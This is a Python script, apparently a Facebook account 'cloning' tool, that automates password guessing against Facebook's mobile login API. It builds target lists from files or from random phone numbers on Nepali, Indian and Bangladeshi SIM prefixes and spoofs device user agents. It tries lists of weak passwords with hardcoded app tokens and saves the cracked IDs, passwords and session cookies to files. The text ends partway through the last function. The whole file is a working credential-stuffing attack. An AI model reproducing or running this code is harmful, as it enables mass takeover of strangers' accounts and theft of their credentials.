""" WRITTEN BY ---( EXILEOMINOUS )--- """
##--------------( NEON ZONE )-------------##
import os,re,sys,time,random,uuid,json,shutil
import datetime,string,base64,zlib,hashlib,struct
import threading,io,pycurl,subprocess,platform,rich
import requests,mechanize,bs4,httpx,httplib2,urllib
from os import system
from io import BytesIO
from time import sleep
from shutil import rmtree
from zlib import decompress
from bs4 import BeautifulSoup
from datetime import datetime
from time import time as timee
from pip._vendor import requests
from urllib.request import urlopen
from urllib.error import URLError as errorlib
from concurrent.futures import ThreadPoolExecutor as tani
##--------------( NEON ZONE )-------------##
N = '\x1b'+'[9'+'0m'
R = '\x1b'+'[9'+'1m'
G = '\x1b'+'[9'+'2m'
Y = '\x1b'+'[9'+'3m'
B = '\x1b'+'[9'+'4m'
I = '\x1b'+'[9'+'5m'
S = '\x1b'+'[9'+'6m'
W = '\x1b'+'[9'+'7m'
M = '\x1b['+'38'+';5;'+'45m'
A = '\x1b['+'38'+';5;'+'46m'
C = '\x1b['+'38'+';5;'+'56m'
T = '\x1b['+'38'+';5;'+'193m'
D = '\x1b['+'38'+';5;'+'196m'
Z = '\x1b['+'38'+';5;'+'203m'
F = '\x1b['+'38'+';5;'+'208m'
##--------------( NEON ZONE )-------------##
database = {"1":"January","2":"February","3":"March","4":"April","5":"May","6":"June","7":"July","8":"August","9":"September","10":"October","11":"November","12":"December"}
date = datetime.now().day
month = database[str(datetime.now().month)]
year = datetime.now().year
##--------------( NEON ZONE )-------------##
http = httplib2.Http()
session = requests.Session()
brs = mechanize.Browser()
brs.set_handle_robots(False)
brs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
##--------------( NEON ZONE )-------------##
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
sys.stdout.write('\x1b]2; (NEON ZONE) \x07')
MY_KEY = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()
##--------------( NEON ZONE )-------------##
loop=0
count = 0
oks = []
cps = []
twf = []
bou = []
apk = []
ugen = []
agent = []
screen = []
methods = []
password = []
##--------------( NEON ZONE )-------------##
for win in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    agent.append(uaku2)
##--------------( NEON ZONE )-------------##
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    agent.append(uaku)
##--------------( NEON ZONE )-------------##
for i in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
##--------------( NEON ZONE )-------------##
choaa = sys.platform.lower()
if choaa == "linux":screen.append('android')
elif choaa == "win":screen.append('window')
else:screen.append('android')
##--------------( NEON ZONE )-------------##
def clean():
    if "android" in screen:system('clear')
    elif "window" in screen:system('cls')
    else: raise NameError(' SOMETHING WENT WRONG')
##--------------( NEON ZONE )-------------##
mod1 = random.choice(['GT-I9195','SM-J200F','SM-T530','SAMSUNG-SM-G530AZ','SM-T113NU','SM-A520F','SM-N910F','SM-G973U','SM-A205U'])
mod2 = random.choice(['Redmi Note 5','Redmi 7A','Mi A1','Redmi Note 8 Pro','POCOPHONE F1','M2003J15SC','M2004J19C','Redmi Note 8T','Mi A2 Lite','Redmi Y2'])
##--------------( NEON ZONE )-------------##
def NEONUA1():
    android_version = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    version_code = random.randint(111111111,999999999)
    ua = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{str(version_code)};"+"FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/"+str(version_code)+";FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(mod1)+";FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
    uaa = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{str(version_code)};"+"FBDM/{density=2.625,width=1080,height=2131};FBLC/en_US;FBRV/"+str(version_code)+";FBCR/WIFI;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(mod1)+";FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
    return str(random.choice([ua,uaa]))
##--------------( NEON ZONE )-------------##
def NEONUA2():
    android_version = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    version_code = random.randint(111111111,999999999)
    ua = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{str(version_code)};"+"FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/"+str(version_code)+";FBCR/Airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/"+str(mod2)+";FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaa = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{str(version_code)};"+"FBDM/{density=2.75,width=1080,height=2168};FBLC/en_US;FBRV/"+str(version_code)+";FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/"+str(mod2)+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    return str(random.choice([ua,uaa]))
##--------------( NEON ZONE )-------------##
def m4_ua():
    samsung = random.choice(["SM-J200F", "SM-J200G", "SM-J200H", "SM-J200GU", "SM-J200M", "SM-J200Y", "SM-A556V", "SM-A556U", "SM-A556U1", "SM-A556B", "SM-A556B", "SM-A556E", "SM-A556E", "SM-A5560", "SM-A205F", "SM-A205FN", "SM-A205U", "SM-A205GN", "SM-A205YN", "SM-A205G", "SM-A205W", "SM-A205F", "SM-A205FN", "SM-A205GN", "SM-A205YN", "SM-A205G", "SM-A205W", "SM-A205U", "SM-A205S", "SM-S205DL", "SM-A205U1", "SM-A405F", "SM-A405FN", "SM-A405FM", "SM-A405S", "SM-A920F", "SM-A9200", "SM-A920N", "SM-A920X", "SM-A505F", "SM-A505FN", "SM-A505GN", "SM-A505G", "SM-A505FM", "SM-A505YN", "SM-A505W", "SM-A505X", "SM-A505U", "SM-A505GT", "SM-A505U1", "SM-A505G", "SM-A505N", "SM-S506DL", "SM-E225F", "SM-E225F"])
    uaa = '[FBAN/FB4A;FBAV/'+str(random.randint(10,200))+'.0.0.'+str(random.randint(1000,2999))+';FBBV/'+str(random.randint(1000000,2999999))+';[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/'+samsung+';FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]'
    uab = '[FBAN/FB4A;FBAV/'+str(random.randint(10,200))+'.0.0.'+str(random.randint(1000,2999))+';FBBV/'+str(random.randint(1000000,2999999))+';[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/X430;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=1920};]'
    uac = '[FBAN/Orca-Android;FBAV/378.0.0.67.84;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/366691894;FBCR/3ITA;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 10 Lite;FBSV/10;FBCA/x86:armeabi-v7a;FBDM/{density=2.8125,width=1080,height=2208};]'
    uad = '[FBAN/Orca-Android;FBAV/133.0.0.59.88;FBPN/com.facebook.orca;FBLC/en_US;FBBV/310330937;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/X430;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=1920};]'
    uae = '[FBAN/Orca-Android;FBAV/432.0.0.39.118;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/316408629;FBCR/CHEN PHONE IDEA;FBMF/jakumagirpula;FBBD/jakumagirpula;'+f'FBDV/MAGINO{str(random.randint(1700,4000))};'+'FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=1920};]'
    ua = random.choice([uaa,uab,uac,uad,uae])
def NEONUA3():
    android_version = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    version_code = random.randint(111111111,999999999)
    ua = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{str(version_code)};"+"FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBRV/289140577;FBCR/JIO 4G;FBMF/Micromax;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/Micromax Q402+;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaa = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{str(version_code)};"+"FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/316515843;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONE A2003;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return str(random.choice([ua,uaa]))
##--------------( NEON ZONE )-------------##
X = f"{W}[{G}+{W}]"
def box(c):
    value = f"{N}[{W}{c}{N}]{W}"
    return value
##--------------( NEON ZONE )-------------##
logo = f"""{W}
{white} ███    ██ ███████  ██████  ███    ██ {cyan}• {green}P
{white} ████   ██ ██      ██    ██ ████   ██ {cyan}• {purple}R
{white} ██ ██  ██ █████   ██    ██ ██ ██  ██ {cyan}• {white}I
{white} ██  ██ ██ ██      ██    ██ ██  ██ ██ {cyan}• {blue}M
{white} ██   ████ ███████  ██████  ██   ████ {cyan}• {red}E      
{white}{45*'━'}
{X} FACEBOOK    : EXILEOMINOUS
{X} FEATURE     : FILE{G}〤{W}RANDOM
{X} VERSION     : {Y}0.0 {G}TRAIL
{X} GITHUB      : Exileominous
{45*'━'}"""
line = f"{W}{45*'━'}"
##--------------( NEON ZONE )-------------##
def banner():clean();print(logo)
def linex():print(line)
##--------------( NEON ZONE )-------------##
def dtls():
    print(f"{X} START TIME  : {G}{date}{R}~{G}{month}{R}~{G}{year}")
    print(f"{X} KEY :{G} {MY_KEY}")
    linex()
##--------------( NEON ZONE )-------------##
package = "NEON-XD"
##--------------( NEON ZONE )-------------##
def convert(cookie):
    cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
    return(str(cok))
##--------------( NEON ZONE )-------------##
def check_apk(cookie):
    session = requests.Session()
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\r{X} Not Found Active Aps && Website')
    else:
        print(f'\r\r{X} Active Aps && Website')
        for i in range(len(game)):
            print(f"\r\r{X}-{box(i+1)}{A} %s"%(game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\r{X} Not Found Expired Aps && Website')
    else:
        print(f'\r\r{X} Expire Aps && Website')
        for i in range(len(game)):
            print(f"\r\r{X}-{box(i+1)}{D} %s"%(game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
##--------------( NEON ZONE )-------------##
class Main:
    def Menu():
        banner();dtls()
        print(f"{box('1')} START FILE CLONE")
        print(f"{box('2')} START RANDOM CLONE")
        print(f"{box('3')} JOIN OUR GROUP (WP)")
        print(f"{box('4')} FOLLOW MY GITHUB")
        print(f"{box('5')} EXIT PROGRAM")
        linex()
        Neon = input(f"{X} Choose -{G} ");linex()
        if Neon == "1":FileCloning()
        elif Neon == "2":RandomCloning()
        elif Neon == "3":system('xdg-open')
        elif Neon == "4":system('xdg-open')
        elif Neon == "5":sys.exit()
        else:Main.Start()
##--------------( NEON ZONE )-------------##
def FileCloning():
    banner();dtls()
    print(f"{X} EXAMPLE   : /sdcard/NEON.txt")
    file = input(f"{X} ADDRESS   :{G} ");linex()
    try:choa = open(file,'r').read().splitlines()
    except FileNotFoundError:FileNotFoundError()
    print(f"{X} MAX PASSWORD LIMIT : 20")
    try:limit = int(input(f"{X} PASSWORD  :{G} "));linex()
    except:limit = "5"
    print(f"{X} EXAMPLE   : firstlast,first123,last123,etc")
    for pq in range(limit):
        password.append(input(f"{X} PASSWORD NO.{pq+1}:{G} "))
    linex()
    print(f"{X} C_METHOD  : 1>2>3")
    mt = input(f"{X} SERVER    :{G} ");linex()
    if mt == "1":methods.append('mA')
    elif mt == "2":methods.append('mB')
    elif mt == "3":methods.append('mC')
    else:methods.append("mA")
    with tani(max_workers=30) as My_Tanisha:
        banner();dtls()
        print(f"{X} TOTAL IDS   :{G} {str(len(choa))}")
        print(f"{X} C_METHOD    :{S} {mt}")
        print(f"{X} IF NO RESULT [ON/OFF] FLIGHT MODE")
        linex()
        for user in choa:
            ids,names = user.split('|')
            passlist = password
            if "mA" in methods:My_Tanisha.submit(methodA,ids,names,passlist)
            elif "mB" in methods:My_Tanisha.submit(methodB,ids,names,passlist)
            elif "mC" in methods:My_Tanisha.submit(methodC,ids,names,passlist)
            else:My_Tanisha.submit(methodA,ids,names,passlist)
    print('\n')
    linex()
    print(f"{X} TOTAL OK ID  :{G} {str(len(oks))}")
    print(f"{X} TOTAL CP ID  :{R} {str(len(cps))}")
    linex()
    input(f"{X} PRESS ENTER TO BACK MAIN-MENU")
##--------------( NEON ZONE )-------------##
def RandomCloning():
    banner();dtls()
    print(f"{box('1')} NEPAL CLONING")
    print(f"{box('2')} INDIAN CLONING")
    print(f"{box('3')} BANGLADESH CLONING")
    print(f"{box('4')} ALL COUNTRIES CLONING")
    linex()
    clone = input(f"{X} Choose  - ");linex()
    if clone == "1":Cloning("nepal")
    elif clone =="2":Cloning('indian')
    elif clone == "3":Cloning('bangladesh')
    elif clone == "4":Cloning('mix')
##--------------( NEON ZONE )-------------##
def Cloning(value):
    if value.lower() == "nepal":
        banner();dtls()
        print(f"{X} EXAMPLE     : 9815,9814,9861,9840")
        code = input(f"{X} SIM CODE    :{G} ");linex()
        print(f"{X} EXAMPLE     : 5000,10000,15000")
        try:limit = int(input(f"{X} LIMITATION  :{G} "));linex()
        except:limit = "5000"
        for q in range(limit):
            jan = "".join(random.choice(string.digits) for _ in range(6))
            bou.append(jan)
        methods.append("methodA");tasnim = "1"
        cap = input(f"{X} SHOW APK + COKI [Y/N] : ")
        if cap in ['n','N']:apk.append("n")
        else:apk.append("y")
        with tani(max_workers=30) as My_Tanisha:
            banner();dtls()
            print(f"{X} TOTAL IDS   :{G} {str(len(bou))}")
            print(f"{X} METHOD      :{W} {tasnim}")
            print(f"{X} IF NO RESULT [ON/OFF] FLIGHT MODE")
            linex()
            for love in bou:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,ids[2:],ids[3:],'nepal123','nepal1234','nepal12345','maya123','tamnag','tamnag123','kathmandu','kathmandu123','i love you','nepal@123','sagar123']
                if "methodA" in methods:My_Tanisha.submit(randA,ids,passlist)
                elif "methodB" in methods:My_Tanisha.submit(randB,ids,passlist)
                else:My_Tanisha.submit(randA,ids,passlist)
        print('\n')
        linex()
    elif value.lower() == "indian":
        banner();dtls()
        print(f"{X} EXAMPLE     : 91620,91647,91935,91908")
        code = input(f"{X} SIM CODE    :{G} ");linex()
        print(f"{X} EXAMPLE     : 5000,10000,15000")
        try:limit = int(input(f"{X} LIMITATION  :{G} "));linex()
        except:limit = "5000"
        for q in range(limit):
            jan = "".join(random.choice(string.digits) for _ in range(7))
            bou.append(jan)
        methods.append("methodA");tasnim = "1"
        cap = input(f"{X} SHOW APK + COKI [Y/N] : ")
        if cap in ['n','N']:apk.append("n")
        else:apk.append("y")
        with tani(max_workers=30) as My_Tanisha:
            banner();dtls()
            print(f"{X} TOTAL IDS   :{G} {str(len(bou))}")
            print(f"{X} METHOD      :{W} {tasnim}")
            print(f"{X} IF NO RESULT [ON/OFF] FLIGHT MODE")
            linex()
            for love in bou:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,ids[2:],ids[3:],'57273200','59039200','57575751','57575752','07860786','tripura','i love you']
                if "methodA" in methods:My_Tanisha.submit(randA,ids,passlist)
                elif "methodB" in methods:My_Tanisha.submit(randB,ids,passlist)
                else:My_Tanisha.submit(randA,ids,passlist)
        print('\n')
        linex()
    elif value.lower() == "bangladesh":
        banner();dtls()
        print(f"{X} EXAMPLE     : 016,017,018,019")
        code = input(f"{X} SIM CODE    :{G} ");linex()
        print(f"{X} EXAMPLE     : 5000,10000,15000")
        try:limit = int(input(f"{X} LIMITATION  :{G} "));linex()
        except:limit = "5000"
        for q in range(limit):
            jan = "".join(random.choice(string.digits) for _ in range(8))
            bou.append(jan)
        methods.append("methodA");tasnim = "1"
        cap = input(f"{X} SHOW APK + COKI [Y/N] : ")
        if cap in ['n','N']:apk.append("n")
        else:apk.append("y")
        with tani(max_workers=30) as My_Tanisha:
            banner();dtls()
            print(f"{X} TOTAL IDS   :{G} {str(len(bou))}")
            print(f"{X} METHOD      :{W} {tasnim}")
            print(f"{X} IF NO RESULT [ON/OFF] FLIGHT MODE")
            linex()
            for love in bou:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:],'bangladesh','bangla','777888','@@@@####','77889900']
                if "methodA" in methods:My_Tanisha.submit(randA,ids,passlist)
                elif "methodB" in methods:My_Tanisha.submit(randB,ids,passlist)
                else:My_Tanisha.submit(randA,ids,passlist)
        print('\n')
        linex()
    elif value.lower() == "mix":
        banner();dtls()
        print(f"{X} USE FULL SIM NUMBER WITH COUNTRY CODE")
        print(f"{X} EXAMPLE    :{S} +8801757391841")
        sim = input(f"{X} SIM CODE   :{G} ");linex()
        code = sim[:-7]
        print(f"{X} EXAMPLE     : 5000,10000,15000")
        try:limit = int(input(f"{X} LIMITATION  :{G} "));linex()
        except:limit = "5000"
        for q in range(limit):
            jan = "".join(random.choice(string.digits) for _ in range(7))
            bou.append(jan)
        methods.append("methodA");tasnim = "1"
        cap = input(f"{X} SHOW APK + COKI [Y/N] : ")
        if cap in ['n','N']:apk.append("n")
        else:apk.append("y")
        with tani(max_workers=30) as My_Tanisha:
            banner();dtls()
            print(f"{X} TOTAL IDS   :{G} {str(len(bou))}")
            print(f"{X} METHOD      :{W} {tasnim}")
            print(f"{X} IF NO RESULT [ON/OFF] FLIGHT MODE")
            linex()
            for love in bou:
                ids = code + love
                passlist = [ids[3:],ids[3:11],ids[3:10],ids[3:9],love,love[1:],"888999","654321","786786"]
                if "methodA" in methods:My_Tanisha.submit(randA,ids,passlist)
                elif "methodB" in methods:My_Tanisha.submit(randB,ids,passlist)
                else:My_Tanisha.submit(randA,ids,passlist)
        print('\n')
        linex()
##--------------( NEON ZONE )-------------##
def methodA(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}NEON-M1{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        for pw in passlist:
            pas = pw.replace('first',first.lower()).replace('last',last.lower()).replace('First',first).replace('Last',last)
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {'User-Agent':NEONUA1(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            Neon = requests.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
            if 'access_token' in Neon:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in Neon["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                print(f"\r\r {A}[NEON-OK] • {ids} • {pas}")
                open('/sdcard/NEON-FILE-M1-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in Neon['error']['message']:
                print(f"\r\r {D}[NEON-CP] • {ids} • {pas}")
                open('/sdcard/NEON-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:pass
##--------------( NEON ZONE )-------------##
def methodB(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}NEON-M2{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        for pw in passlist:
            pas = pw.replace('first',first.lower()).replace('last',last.lower()).replace('First',first).replace('Last',last)
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','fb_api_req_friendly_name':'authenticate'}
            headers={'Authorization':f'OAuth 350685531728|7C62f8ce9f74b12f84c123cc23437a4a32','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent':NEONUA2(),'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
            Neon = requests.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
            if 'access_token' in Neon:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in Neon["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                print(f"\r\r {A}[NEON-OK] • {ids} • {pas}")
                open('/sdcard/NEON-FILE-M2-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in Neon['error']['message']:
                print(f"\r\r {D}[NEON-CP] • {ids} • {pas}")
                open('/sdcard/NEON-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:pass
##--------------( NEON ZONE )-------------##
def methodC(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}NEON-M3{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        for pw in passlist:
            pas = pw.replace('first',first.lower()).replace('last',last.lower()).replace('First',first).replace('Last',last)
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {'User-Agent':NEONUA3(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            Neon = requests.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
            if 'access_token' in Neon:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in Neon["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                print(f"\r\r {A}[NEON-OK] • {ids} • {pas}")
                open('/sdcard/NEON-FILE-M3-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in Neon['error']['message']:
                print(f"\r\r {D}[NEON-CP] • {ids} • {pas}")
                open('/sdcard/NEON-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:pass
##--------------( NEON ZONE )-------------##
def randA(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}NEON-M1{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
